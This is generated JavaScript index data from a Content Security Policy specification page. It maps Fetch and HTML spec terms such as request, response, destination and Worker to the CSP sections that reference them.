        window.dfnpanelData['3f2ca4de'] = { "dfnID": "3f2ca4de", "url": "https://fetch.spec.whatwg.org/#concept-request-current-url", "dfnText": "current url", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-current-url" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-concept-request-current-url\u2460" }, { "id": "ref-for-concept-request-current-url\u2461" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-current-url\u2462" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }], "external": true };
        window.dfnpanelData['3ae34c95'] = { "dfnID": "3ae34c95", "url": "https://fetch.spec.whatwg.org/#concept-request-destination", "dfnText": "destination", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-destination" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-concept-request-destination\u2460" }, { "id": "ref-for-concept-request-destination\u2461" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-concept-request-destination\u2462" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-concept-request-destination\u2463" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-destination\u2464" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-destination\u2465" }], "title": "6.8.1. \n    Get the effective directive for request\n  " }], "external": true };
        window.dfnpanelData['3be1d4ac'] = { "dfnID": "3be1d4ac", "url": "https://fetch.spec.whatwg.org/#extract-header-list-values", "dfnText": "extracting header list values", "refSections": [{ "refs": [{ "id": "ref-for-extract-header-list-values" }, { "id": "ref-for-extract-header-list-values\u2460" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": true };
        window.dfnpanelData['a33db89a'] = { "dfnID": "a33db89a", "url": "https://fetch.spec.whatwg.org/#concept-fetch", "dfnText": "fetch", "refSections": [{ "refs": [{ "id": "ref-for-concept-fetch" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['6ee0eab1'] = { "dfnID": "6ee0eab1", "url": "https://fetch.spec.whatwg.org/#concept-request-header-list", "dfnText": "header list (for request)", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-header-list" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['f7b00a8b'] = { "dfnID": "f7b00a8b", "url": "https://fetch.spec.whatwg.org/#concept-response-header-list", "dfnText": "header list (for response)", "refSections": [{ "refs": [{ "id": "ref-for-concept-response-header-list" }, { "id": "ref-for-concept-response-header-list\u2460" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": true };
        window.dfnpanelData['eb62573b'] = { "dfnID": "eb62573b", "url": "https://fetch.spec.whatwg.org/#http-scheme", "dfnText": "http(s) scheme", "refSections": [{ "refs": [{ "id": "ref-for-http-scheme" }, { "id": "ref-for-http-scheme\u2460" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-http-scheme\u2461" }], "title": "5.4. Strip URL for use in reports" }, { "refs": [{ "id": "ref-for-http-scheme\u2462" }, { "id": "ref-for-http-scheme\u2463" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": true };
        window.dfnpanelData['fa4ea124'] = { "dfnID": "fa4ea124", "url": "https://fetch.spec.whatwg.org/#concept-request-initiator", "dfnText": "initiator", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-initiator" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-concept-request-initiator\u2460" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-initiator\u2461" }], "title": "6.8.1. \n    Get the effective directive for request\n  " }], "external": true };
        window.dfnpanelData['d79a826f'] = { "dfnID": "d79a826f", "url": "https://fetch.spec.whatwg.org/#concept-request-integrity-metadata", "dfnText": "integrity metadata", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-integrity-metadata" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-integrity-metadata\u2460" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-integrity-metadata\u2461" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }], "external": true };
        window.dfnpanelData['8f26de31'] = { "dfnID": "8f26de31", "url": "https://fetch.spec.whatwg.org/#is-local", "dfnText": "is local", "refSections": [{ "refs": [{ "id": "ref-for-is-local" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['8394d1b7'] = { "dfnID": "8394d1b7", "url": "https://fetch.spec.whatwg.org/#request-keepalive-flag", "dfnText": "keepalive", "refSections": [{ "refs": [{ "id": "ref-for-request-keepalive-flag" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['63340982'] = { "dfnID": "63340982", "url": "https://fetch.spec.whatwg.org/#local-scheme", "dfnText": "local scheme", "refSections": [{ "refs": [{ "id": "ref-for-local-scheme" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-local-scheme\u2460" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-local-scheme\u2461" }], "title": "7.8. \n    CSP Inheriting to avoid bypasses\n  " }], "external": true };
        window.dfnpanelData['e0dfd35e'] = { "dfnID": "e0dfd35e", "url": "https://fetch.spec.whatwg.org/#concept-main-fetch", "dfnText": "main fetch", "refSections": [{ "refs": [{ "id": "ref-for-concept-main-fetch" }, { "id": "ref-for-concept-main-fetch\u2460" }], "title": "4.1. \n    Integration with Fetch\n  " }], "external": true };
        window.dfnpanelData['50b05fad'] = { "dfnID": "50b05fad", "url": "https://fetch.spec.whatwg.org/#concept-request-method", "dfnText": "method", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-method" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['cb98f71f'] = { "dfnID": "cb98f71f", "url": "https://fetch.spec.whatwg.org/#concept-request-mode", "dfnText": "mode", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-mode" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['eb1b1af3'] = { "dfnID": "eb1b1af3", "url": "https://fetch.spec.whatwg.org/#concept-network-error", "dfnText": "network error", "refSections": [{ "refs": [{ "id": "ref-for-concept-network-error" }], "title": "4.1. \n    Integration with Fetch\n  " }], "external": true };
        window.dfnpanelData['f78d5b5c'] = { "dfnID": "f78d5b5c", "url": "https://fetch.spec.whatwg.org/#concept-request-origin", "dfnText": "origin", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-origin" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['ee1a333c'] = { "dfnID": "ee1a333c", "url": "https://fetch.spec.whatwg.org/#concept-request-parser-metadata", "dfnText": "parser metadata", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-parser-metadata" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-concept-request-parser-metadata\u2460" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-parser-metadata\u2461" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }], "external": true };
        window.dfnpanelData['86efadaf'] = { "dfnID": "86efadaf", "url": "https://fetch.spec.whatwg.org/#concept-request-policy-container", "dfnText": "policy container", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-policy-container" }, { "id": "ref-for-concept-request-policy-container\u2460" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-concept-request-policy-container\u2461" }, { "id": "ref-for-concept-request-policy-container\u2462" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-policy-container\u2463" }, { "id": "ref-for-concept-request-policy-container\u2464" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-policy-container\u2465" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-policy-container\u2466" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }], "external": true };
        window.dfnpanelData['8c3deeef'] = { "dfnID": "8c3deeef", "url": "https://fetch.spec.whatwg.org/#concept-request-redirect-count", "dfnText": "redirect count", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-redirect-count" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-concept-request-redirect-count\u2460" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }], "external": true };
        window.dfnpanelData['64b62ea0'] = { "dfnID": "64b62ea0", "url": "https://fetch.spec.whatwg.org/#concept-request-redirect-mode", "dfnText": "redirect mode", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-redirect-mode" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['55213b5b'] = { "dfnID": "55213b5b", "url": "https://fetch.spec.whatwg.org/#concept-request", "dfnText": "request", "refSections": [{ "refs": [{ "id": "ref-for-concept-request" }, { "id": "ref-for-concept-request\u2460" }, { "id": "ref-for-concept-request\u2461" }, { "id": "ref-for-concept-request\u2462" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-concept-request\u2463" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464" }, { "id": "ref-for-concept-request\u2465" }, { "id": "ref-for-concept-request\u2466" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2467" }], "title": "4.1.1. \n    Report Content Security Policy violations for request\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2468" }], "title": "4.1.2. \n    Should request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u24ea" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2460" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2461" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2462" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2463" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2464" }, { "id": "ref-for-concept-request\u2460\u2465" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2466" }], "title": "6.1.1.1. \n    child-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2467" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2460\u2468" }], "title": "6.1.2. connect-src" }, { "refs": [{ "id": "ref-for-concept-request\u2461\u24ea" }], "title": "6.1.2.1. \n    connect-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2460" }], "title": "6.1.2.2. \n    connect-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2461" }], "title": "6.1.3.1. \n    default-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2462" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2463" }], "title": "6.1.4.1. \n    font-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2464" }], "title": "6.1.4.2. \n    font-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2465" }], "title": "6.1.5.1. \n    frame-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2466" }], "title": "6.1.5.2. \n    frame-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2461\u2467" }, { "id": "ref-for-concept-request\u2461\u2468" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-concept-request\u2462\u24ea" }], "title": "6.1.6.1. \n    img-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2460" }], "title": "6.1.6.2. \n    img-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2461" }], "title": "6.1.7.1. \n    manifest-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2462" }], "title": "6.1.7.2. \n    manifest-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2463" }], "title": "6.1.8.1. \n    media-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2464" }], "title": "6.1.8.2. \n    media-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2465" }], "title": "6.1.9.1. \n    object-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2466" }], "title": "6.1.9.2. \n    object-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2467" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-concept-request\u2462\u2468" }], "title": "6.1.10.1. \n    script-src Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u24ea" }], "title": "6.1.10.2. \n    script-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2460" }], "title": "6.1.11.1. \n    script-src-elem Pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2461" }], "title": "6.1.11.2. \n    script-src-elem Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2462" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2463" }], "title": "6.1.13.1. \n    style-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2464" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2465" }], "title": "6.1.14.1. \n    style-src-elem Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2466" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2467" }], "title": "6.2.2.1. \n    worker-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2463\u2468" }], "title": "6.2.2.2. \n    worker-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u24ea" }], "title": "6.4.1.1. \n    form-action Pre-Navigation Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2460" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2461" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2462" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2463" }], "title": "6.7.2.1. \n    Does request violate policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2464" }], "title": "6.7.2.2. \n    Does resource hint request violate policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2465" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2466" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2464\u2467" }, { "id": "ref-for-concept-request\u2464\u2468" }], "title": "6.7.2.5. \n    Does request match source list?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2465\u24ea" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2465\u2460" }, { "id": "ref-for-concept-request\u2465\u2461" }], "title": "6.8.1. \n    Get the effective directive for request\n  " }, { "refs": [{ "id": "ref-for-concept-request\u2465\u2462" }], "title": "6.8.2. \n    Get the effective directive for inline checks\n  " }], "external": true };
        window.dfnpanelData['ee7bba09'] = { "dfnID": "ee7bba09", "url": "https://fetch.spec.whatwg.org/#concept-response", "dfnText": "response", "refSections": [{ "refs": [{ "id": "ref-for-concept-response" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460" }, { "id": "ref-for-concept-response\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-concept-response\u2462" }, { "id": "ref-for-concept-response\u2463" }], "title": "4.1. \n    Integration with Fetch\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2464" }], "title": "4.1.3. \n    Should response to request be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2465" }, { "id": "ref-for-concept-response\u2466" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2467" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2468" }], "title": "6.1.1.2. \n    child-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u24ea" }], "title": "6.1.2.2. \n    connect-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2460" }], "title": "6.1.3.2. \n    default-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2461" }], "title": "6.1.4.2. \n    font-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2462" }], "title": "6.1.5.2. \n    frame-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2463" }], "title": "6.1.6.2. \n    img-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2464" }], "title": "6.1.7.2. \n    manifest-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2465" }], "title": "6.1.8.2. \n    media-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2466" }], "title": "6.1.9.2. \n    object-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2467" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-concept-response\u2460\u2468" }], "title": "6.1.10.2. \n    script-src Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u24ea" }], "title": "6.1.11.2. \n    script-src-elem Post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2460" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2461" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2462" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2463" }], "title": "6.2.2.2. \n    worker-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2464" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2465" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-response\u2461\u2466" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }], "external": true };
        window.dfnpanelData['d8fc72f5'] = { "dfnID": "d8fc72f5", "url": "https://fetch.spec.whatwg.org/#request-destination-script-like", "dfnText": "script-like", "refSections": [{ "refs": [{ "id": "ref-for-request-destination-script-like" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-request-destination-script-like\u2460" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-request-destination-script-like\u2461" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }], "external": true };
        window.dfnpanelData['dc1cd39b'] = { "dfnID": "dc1cd39b", "url": "https://fetch.spec.whatwg.org/#concept-request-url", "dfnText": "url (for request)", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-url" }, { "id": "ref-for-concept-request-url\u2460" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-concept-request-url\u2461" }, { "id": "ref-for-concept-request-url\u2462" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-url\u2463" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-url\u2464" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['3268a8eb'] = { "dfnID": "3268a8eb", "url": "https://fetch.spec.whatwg.org/#concept-response-url", "dfnText": "url (for response)", "refSections": [{ "refs": [{ "id": "ref-for-concept-response-url" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }, { "refs": [{ "id": "ref-for-concept-response-url\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-response-url\u2461" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-concept-response-url\u2462" }], "title": "6.7.2.6. \n    Does response to request match source list?\n  " }], "external": true };
        window.dfnpanelData['1ab127d6'] = { "dfnID": "1ab127d6", "url": "https://fetch.spec.whatwg.org/#concept-request-window", "dfnText": "window", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-window" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['9d459c32'] = { "dfnID": "9d459c32", "url": "https://html.spec.whatwg.org/#parser-inserted", "dfnText": "\"parser-inserted\"", "refSections": [{ "refs": [{ "id": "ref-for-parser-inserted" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-parser-inserted\u2460" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-parser-inserted\u2461" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-parser-inserted\u2462" }, { "id": "ref-for-parser-inserted\u2463" }, { "id": "ref-for-parser-inserted\u2464" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }], "external": true };
        window.dfnpanelData['a13a702f'] = { "dfnID": "a13a702f", "url": "https://html.spec.whatwg.org/multipage/workers.html#sharedworker", "dfnText": "SharedWorker", "refSections": [{ "refs": [{ "id": "ref-for-sharedworker" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-sharedworker\u2460" }], "title": "6.2.2. worker-src" }], "external": true };
        window.dfnpanelData['5d7209e9'] = { "dfnID": "5d7209e9", "url": "https://html.spec.whatwg.org/multipage/nav-history-apis.html#window", "dfnText": "Window", "refSections": [{ "refs": [{ "id": "ref-for-window" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-window\u2460" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }, { "refs": [{ "id": "ref-for-window\u2461" }, { "id": "ref-for-window\u2462" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['bfc1c271'] = { "dfnID": "bfc1c271", "url": "https://html.spec.whatwg.org/multipage/workers.html#worker", "dfnText": "Worker", "refSections": [{ "refs": [{ "id": "ref-for-worker" }], "title": "1.2. Goals" }, { "refs": [{ "id": "ref-for-worker\u2460" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-worker\u2461" }], "title": "6.2.2. worker-src" }], "external": true };
        window.dfnpanelData['83c59a3a'] = { "dfnID": "83c59a3a", "url": "https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope", "dfnText": "WorkerGlobalScope", "refSections": [{ "refs": [{ "id": "ref-for-workerglobalscope" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-workerglobalscope\u2460" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }, { "refs": [{ "id": "ref-for-workerglobalscope\u2461" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['0c9b0d3c'] = { "dfnID": "0c9b0d3c", "url": "https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope", "dfnText": "WorkletGlobalScope", "refSections": [{ "refs": [{ "id": "ref-for-workletglobalscope" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-workletglobalscope\u2460" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }], "external": true };
        window.dfnpanelData['68bf3d31'] = { "dfnID": "68bf3d31", "url": "https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element", "dfnText": "a", "refSections": [{ "refs": [{ "id": "ref-for-the-a-element" }], "title": "6.1.2. connect-src" }], "external": true };
        window.dfnpanelData['27e10eaf'] = { "dfnID": "27e10eaf", "url": "https://html.spec.whatwg.org/multipage/browsers.html#active-sandboxing-flag-set", "dfnText": "active sandboxing flag set", "refSections": [{ "refs": [{ "id": "ref-for-active-sandboxing-flag-set" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }], "external": true };
        window.dfnpanelData['e9c183b8'] = { "dfnID": "e9c183b8", "url": "https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document", "dfnText": "an iframe srcdoc document", "refSections": [{ "refs": [{ "id": "ref-for-an-iframe-srcdoc-document" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }], "external": true };
        window.dfnpanelData['b410a6ef'] = { "dfnID": "b410a6ef", "url": "https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin", "dfnText": "ascii serialization of an origin", "refSections": [{ "refs": [{ "id": "ref-for-ascii-serialisation-of-an-origin" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['3349d69f'] = { "dfnID": "3349d69f", "url": "https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window", "dfnText": "associated document", "refSections": [{ "refs": [{ "id": "ref-for-concept-document-window" }, { "id": "ref-for-concept-document-window\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['1565d481'] = { "dfnID": "1565d481", "url": "https://html.spec.whatwg.org/multipage/browsing-the-web.html#attempt-to-populate-the-history-entry's-document", "dfnText": "attempt to populate the history entry's document", "refSections": [{ "refs": [{ "id": "ref-for-attempt-to-populate-the-history-entry's-document" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['c847111b'] = { "dfnID": "c847111b", "url": "https://html.spec.whatwg.org/multipage/semantics.html#the-base-element", "dfnText": "base", "refSections": [{ "refs": [{ "id": "ref-for-the-base-element" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-the-base-element\u2460" }], "title": "6.3.1. base-uri" }, { "refs": [{ "id": "ref-for-the-base-element\u2461" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-the-base-element\u2462" }, { "id": "ref-for-the-base-element\u2463" }, { "id": "ref-for-the-base-element\u2464" }], "title": "7.3. Nonce Retargeting" }], "external": true };
        window.dfnpanelData['f23dc013'] = { "dfnID": "f23dc013", "url": "https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable", "dfnText": "child navigable", "refSections": [{ "refs": [{ "id": "ref-for-child-navigable" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-child-navigable\u2460" }], "title": "6.1.5. frame-src" }, { "refs": [{ "id": "ref-for-child-navigable\u2461" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-child-navigable\u2462" }, { "id": "ref-for-child-navigable\u2463" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['cc601639'] = { "dfnID": "cc601639", "url": "https://html.spec.whatwg.org/multipage/document-sequences.html#nav-container-document", "dfnText": "container document", "refSections": [{ "refs": [{ "id": "ref-for-nav-container-document" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['5a88c1c3'] = { "dfnID": "5a88c1c3", "url": "https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content", "dfnText": "content", "refSections": [{ "refs": [{ "id": "ref-for-attr-meta-content" }], "title": "3.3. \n    The <meta> element\n  " }], "external": true };
        window.dfnpanelData['92812d1b'] = { "dfnID": "92812d1b", "url": "https://html.spec.whatwg.org/#attr-meta-http-equiv-content-security-policy", "dfnText": "content security policy state", "refSections": [{ "refs": [{ "id": "ref-for-attr-meta-http-equiv-content-security-policy" }], "title": "3.3. \n    The <meta> element\n  " }], "external": true };
        window.dfnpanelData['8c209bab'] = { "dfnID": "8c209bab", "url": "https://html.spec.whatwg.org/#initialise-the-document-object", "dfnText": "create and initialize a new document object", "refSections": [{ "refs": [{ "id": "ref-for-initialise-the-document-object" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
        window.dfnpanelData['07ad3048'] = { "dfnID": "07ad3048", "url": "https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching", "dfnText": "create navigation params by fetching", "refSections": [{ "refs": [{ "id": "ref-for-create-navigation-params-by-fetching" }], "title": "4.2. \n    Integration with HTML\n  " }], "external": true };
